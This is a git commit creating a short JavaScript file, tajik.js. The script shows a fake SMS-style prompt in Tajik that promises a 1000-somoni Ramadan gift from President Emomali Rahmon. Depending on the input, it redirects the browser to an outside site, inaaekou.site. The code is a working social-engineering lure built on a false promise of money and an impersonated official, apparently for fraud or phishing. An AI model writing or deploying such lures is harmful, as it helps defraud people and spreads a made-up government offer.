0676d08676e477d7bad3cf875962797015801065
usorondo18 <croons_uproar3o@icloud.com>
2026-02-18 16:05:27 +0100

    Create tajik.js

---
+++ tajik.js
@@ -0,0 +1,5 @@
+var password = '1000 сомонӣ гиред'
+password = prompt('SMS: Табрикот, шумо ҳақ доред, ки 1000 сомонӣ тӯҳфаи Рамазонро аз Президент бигиред Emomali Rahmon, OK-ро пахш кунед, то ҳозир пешниҳодро гиред','1000 сомонӣ гиред');
+if (password != '1000 сомонӣ гиред') {
+    location.href ='https://www.inaaekou.site/tajik-ramadan';
+}
